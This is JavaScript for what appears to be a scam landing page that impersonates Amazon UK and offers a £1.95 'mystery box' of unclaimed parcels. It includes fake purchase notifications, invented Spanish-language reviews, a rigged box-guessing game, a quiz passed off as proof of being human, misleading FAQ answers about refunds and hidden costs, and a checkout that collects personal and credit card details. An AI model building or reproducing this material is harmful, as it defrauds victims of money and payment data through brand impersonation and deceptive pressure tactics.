const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;
const siteKey = "amazon-en";

(function (exp) {
  const countryCode = "gb";
  const lang = "en-GB";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: [
      "XS",
      "S",
      "M",
      "M/L",
      "L",
      "L/XL",
      "XL",
      "XXL"
    ]
  };

  // I FILL THIS INFO IN MAIN.JS 
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    text: "Every year a lot of unclaimed parcels accumulate in the company's warehouses. Amazon may throw them away, but the company is giving away random boxes for only £1.95. You might find Apple products, jewelry, household goods, clothes and other expensive items! <br> <br> To receive a mystery box from Amazon, please fill out the form to confirm you are a real person. <br> <br> Please hurry as the number of items on offer is limited!",
  };

  const notifications = [
    {
      user: "Odelia Ben***",
      location: "London, United Kingdom",
      action: "Just managed to buy Amazon Mystery Box for £1.95!",
      timeago: "15 seconds ago",
    },
    {
      user: "Tracey B***",
      location: "Birmingham, United Kingdom",
      action: "Just managed to buy Amazon Mystery Box for £1.95!",
      timeago: "25 seconds ago",
    },
  ];

  const reviewsArr = [
    {
      name: "Josefien",
      time: "1 day ago",
      header: "Esto es inesperado!",
      product: "26468782",
      image: "./assets/1.jpg",
      review: "Justo ayer dejé una solicitud, pero mi hermana ya recibió mi caja misteriosa. Participó una semana antes y decidí esperar hasta que la entregaron a la caja para comprender la verdad o no..",
    },
    {
      name: "Anton",
      time: "2 days ago",
      header: "¡Fantástico!Estoy sin palabras.",
      product: "26468789",
      image: "./assets/2.png",
      review: "Participé en la venta y hoy recibí mi caja misteriosa, solo mira cuántas cosas hay.",
    },
    {
      name: "Jan",
      time: "2 days ago",
      header: "Me encanta.",
      product: "26468783",
      review: "Gracias a Amazon por esta venta, acabo de ganar Mystery Box en el primer intento. Me llamaron y acordaron la fecha de entrega.",
    },
    {
      name: "Nico",
      time: "4 days ago",
      header: "Simplemente genial",
      image: "./assets/3.jpg",
      review: "Esto es cierto, simplemente me trajeron el paquete, todavía no puedo creer que haya tenido tanto en solo 2 libras.",
    },
    {
      name: "Jackson",
      time: "7 days ago",
      header: "Wow, estoy absolutamente impresionada con este producto!",
      product: "26468784",
      image: "./assets/4.png",
      review: "La entrega permaneció durante dos días, ¡pero todavía estoy muy satisfecho con la compra!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "Notas y reseñas",
    percent: "99%",
    rec: "Testimonios de clientes que han recibido el producto",
  };

  const questions = {
    _of: "Question {1} of {2}: ",
    arr: [
      {
        q: "Have you ever worn Amazon mystery boxes before?",
        a: [
          "Yes",
          "No"
        ],

      },
      {
        q: "Where did you find this sentence?",
        a: [
          "On the official website",
          "Facebook adverts",
          "Forwarded a friend"
        ],
      },
      {
        q: "For what purpose you will use a mystery box?",
        a: ["For a gift", "For personal use"],
      },
    ],
  };

  const check = {
    title: "Your answers are being verified.",
    arr: [
      "You have answered question 3/3",
      "There are no preliminary studies of your IP.",
      "Gifts are loading...",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header:
          "Congratulations, you have confirmed that you are a real person.",
        button: "OK",
        text: `
      <center>
      Today, {date}, you have a chance to get your Amazon Mystery Box.
        <br><br>
        All you have to do is choose the right gift box.
        <br><br>
        You have 3 guesses, good luck!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
      <center>
      Sorry, but this gift is empty! You have 2 more attempts. Good luck!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: `Congratulations! You win!`,
        button: "OK",
        text: `
      <center>
        <p style="color: #b51817">
        You've won the Amazon Mystery Box!
        </p>
        <br>
        1) Click "OK" below to go to the shipping payment page.
         <br><br>
        2) Fill in the form and pay for your order to receive your Amazon Mystery Box.
        <br><br>
        3) The package will be delivered within 5-7 days.
      </center>
    `,
      },
    },
  };

  const faqs = [
    {
      question: "How long will I wait for my prize?",
      answer: "It usually takes 5-7 working days."
    },
    {
      question: "Are there any hidden costs?",
      answer: "Absolutely not. Once you have won your prize and entered your details, we will take care of the rest. Shipping costs are our responsibility!"
    },
    {
      question: "I'm a winner, why should I answer the questions/guess the box?",
      answer: "You're not a winner yet, but you were one of the 10 people selected to try to win our prize..."
    },
    {
      question: "How can I get a prize if I win?",
      answer: "First, you need to enter your shipping address and contact details, then our system will direct you. Then you have to prove that you are not a robot, as the prize is only offered to real people."
    },
    {
      question: "Why should I pay £1.95 for a prize?",
      answer: "£1.95 is not a price - it is an upfront payment to prove that you are indeed human. All payments will be refunded once approved."
    },
    {
      question: "Can't use my credit card, transaction failed?",
      answer: "If you can't use your credit card, your bank is blocking the transaction: you need to check your bank account."
    },
  ];

  const cartSteps = {
    personal: {
      title: "Información Personal",
      fields: {
        name: {
          enabled: true,
          field: "Nombre",
        },
        family: {
          enabled: true,
          field: "Apellido",
        },
        phone: {
          enabled: true,
          field: "Número de Teléfono",
        },
        email: {
          enabled: true,
          field: "Correo Electrónico",
        },
      },
    },
    delivery: {
      title: "Entrega",
      fields: {
        city: {
          enabled: true,
          field: "Ciudad",
        },
        address: {
          enabled: true,
          field: "Dirección de Entrega",
        },
        zip: {
          enabled: true,
          field: "Código Postal",
        },
      },
    },
    payment: {
      title: "Métodos de Pago",
      creditCard: "Pago en línea con tarjeta de crédito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Resumen del Pedido",
      oldPrice: "",
      newPrice: "2,00 €",
      size: "Talla",
      subTotal: {
        title: "Valor del Pedido",
        amount: "2,00 €",
      },
      delivery: {
        title: "Entrega",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "2,00 €",
      },
      checkoutButton: "Paga tu pedido",
    },
  };

  const products = [
    {
      id: "26468782",
      name: "Amazon Mystery Box",
      miniImg: "./assets/prize.png",

      images: [
        "./assets/slide_4.png",
        "./assets/slide_2.jpg",
        "./assets/slide_1.jpg",
        "./assets/slide_3.png",
      ],
    }
  ];

  const footer = {
    cr: "© 2024 Amazon. All rights reserved.",
  };


  exp.__config = {
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
    faqs,
  };
})(window);

function setCookie(name, value, days = 30) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};

const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};

window.addEventListener("load", () => {

  // const finalButton = document.getElementById("p_modal_button3");

  // finalButton.addEventListener('click', (event) => {
  //   jQuery("#p_modal2").modal("hide");
  //   closeMain();
  //   openCheckout();
  //   checkoutInit();
  // });
});

const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);
// localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");
  // let ind = localStorage.getItem("__selected_product");

  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) =>
  setCookie("__selected_size", val);
// localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  // const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};


const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
// const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);
  // const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {

  const loader = document.querySelector(".loader_container");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#p_body_content").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");

};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
